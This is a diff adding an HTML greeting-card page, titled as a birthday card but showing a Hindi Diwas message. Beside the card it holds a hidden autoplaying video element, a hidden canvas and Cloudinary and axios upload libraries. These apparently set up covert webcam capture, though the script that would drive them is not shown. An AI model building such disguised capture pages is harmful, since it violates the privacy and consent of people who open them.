@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="./index.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script defer src="./confetti.js"></script>
+  <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"
+      integrity="sha512-WFN04846sdKMIP5LKNphMaWzU7YpMyCU245etK3g/2ARYbPK9Ub18eG+ljU96qKRCWh+quCY7yefSmlkQw1ANQ=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/cloudinary-core/2.11.4/cloudinary-core.min.js"
+      integrity="sha512-IbSnv7d3S0AhZSFfPStsTG9IfssskLtgsm2gbbTjmFM/ssHMIwwwRItZfGQKZYhwVXStAVT7nA+pdu0VTE01lA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"
+      integrity="sha512-bZS47S7sPOxkjU/4Bt0zrhEtWx0y0CRkhEp8IckzK+ltifIIE9EMIMTuT/mEzoIMewUINruDBIR/jJnbguonqQ=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+
+  <script defer src="./main.js"></script>
+  <title>Happy Birthday Sairali</title>
+</head>
+<body>
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <canvas id="my-canvas"></canvas>
+  <div class="card">
+    <img src="./image.jpg" alt="birthday" class="birthday">
+    <div class="text">
+      <h1>Hindi Diwas!</h1>
+      <p>Ekta Ki Jaan, Hindi Bharat ki Shaan</p>
+      <p class="muted">- Zeeshan Raza</p>
+    </div>
+    <div class="space">
+      <button id="btn">Click Me</button>
+    </div>
+  </div>
+</body>
+</html>
